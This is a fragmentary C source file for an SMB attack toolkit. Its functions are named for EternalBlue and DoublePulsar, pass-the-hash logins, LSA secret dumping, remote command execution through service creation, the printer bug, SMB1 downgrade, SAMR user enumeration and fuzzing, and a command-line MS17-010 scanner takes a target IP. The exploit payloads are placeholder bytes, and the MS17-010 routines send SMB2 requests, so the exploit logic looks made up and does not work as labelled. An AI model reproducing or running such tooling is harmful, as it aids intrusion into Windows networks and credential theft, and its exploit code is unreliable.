...
int recvSMB2Response(SMB2Header *outHdr, void *outBuf, size_t bufSize, ssize_t *outPayloadLen) {
    ...
    if (recvd <= 0) return -1;
    if (recvd < (ssize_t)sizeof(SMB2Header)) return -1;
...
int doNegotiate() {
    ...
    if (send(gSock, dialects, sizeof(dialects), 0) < 0) return -1;
    SMB2Header respHdr;
    unsigned char buf[1024];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
    if (respHdr.Status != STATUS_SUCCESS) return -1;
    return 0;
}
...
int doFuzzSMB2(size_t fuzzCount) {
    ...
    for (size_t i = 0; i < fuzzCount; i++) {
        buildSMB2Header(SMB2_WRITE, gTreeId, gSessionId, &hdr);
        if (sendSMB2Request(&hdr, fuzzData, sizeof(fuzzData)) < 0) return -1;
        SMB2Header respHdr;
        unsigned char buf[512];
        ssize_t payloadLen;
        if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
...
int doChainedIOCTLTests() {
    ...
    for (int i = 0; i < 5; i++) {
        ...
        doIOCTL(ctl, exampleData, sizeof(exampleData));
    }
    return 0;
}
...
int doSMBGhostProbe() {
    ...
    if (send(gSock, transformHeader, sizeof(transformHeader), 0) < 0) return -1;
    SMB2Header ghostResp;
    unsigned char buf[512];
    ssize_t payloadLen;
    if (recvSMB2Response(&ghostResp, buf, sizeof(buf), &payloadLen) < 0) return -1;
    return 0;
}

int doSamrEnumUsers() {
    if (doOpenPipe("\\PIPE\\samr") < 0) return -1;
...
int doMS17_010Check() {
    ...
    exploitData[2] = 0x17;
    exploitData[3] = 0x01;
    if (sendSMB2Request(&hdr, exploitData, sizeof(exploitData)) < 0) return -1;
    SMB2Header respHdr;
    unsigned char buf[512];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
...
int doPrinterBug() {
    if (doOpenPipe("\\PIPE\\spoolss") < 0) return -1;
...
int doRemoteRegistryOpen() {
    if (doOpenPipe("\\PIPE\\winreg") < 0) return -1;
...
int doPassTheHashSession(const char *nthash) {
    ...
    if (sendSMB2Request(&hdr, &ssreq, sizeof(ssreq)) < 0) return -1;
    if (send(gSock, fakeHashBuf, sizeof(fakeHashBuf), 0) < 0) return -1;
    SMB2Header respHdr;
    unsigned char buf[1024];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
...
int doNamedPipeImpersonation() {
    if (doOpenPipe("\\PIPE\\impersonation") < 0) return -1;
...
int doEternalBlueExploit() {
    ...
    ebData[0] = 0x45;
    ebData[1] = 0x42;
    if (sendSMB2Request(&hdr, ebData, sizeof(ebData)) < 0) return -1;
    SMB2Header respHdr;
    unsigned char buf[512];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
...
int doDoublePulsarCheck() {
    ...
    dpData[0] = 0x44;
    dpData[1] = 0x50;
    if (sendSMB2Request(&hdr, dpData, sizeof(dpData)) < 0) return -1;
    SMB2Header respHdr;
    unsigned char buf[512];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
...
int doSVCCTLRemoteExec(const char *cmd) {
    ...
    if (doSVCCTLCreateService(svcName, binPath) < 0) return -1;
    doSVCCTLStartService(svcName);
    doSVCCTLDeleteService(svcName);
    return 0;
}
...
int doSMB1DowngradeAttack() {
    ...
    smb1Neg[4] = 0x72;
    if (send(gSock, smb1Neg, sizeof(smb1Neg), 0) < 0) return -1;
...
int doDumpLSASecrets() {
    if (doOpenPipe("\\PIPE\\lsarpc") < 0) return -1;
...
/* Simple scanner function added below */
static int scanAndCheckMS17_010(const char *ip, int port) {
    ...
    gSock = s;
    if (doNegotiate() == 0 && doSessionSetup() == 0) {
        char ipcPath[256];
        snprintf(ipcPath, sizeof(ipcPath), "\\\\%s\\IPC$", ip);
...
int main(int argc, char *argv[]) {
    if (argc == 4 && !strcmp(argv[1], "scan")) {
        ...
        printf("Scanning %s for MS17-010 on port %d\n", argv[2], port);
        scanAndCheckMS17_010(argv[2], port);
        return 0;
    }
    ...
    if (argc < 3) {
        ...
        fprintf(stderr, "  %s scan <server_ip> <server_port>\n", argv[0]);
        return EXIT_FAILURE;
    }
    ...
    if (gSock < 0) return EXIT_FAILURE;
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(port);
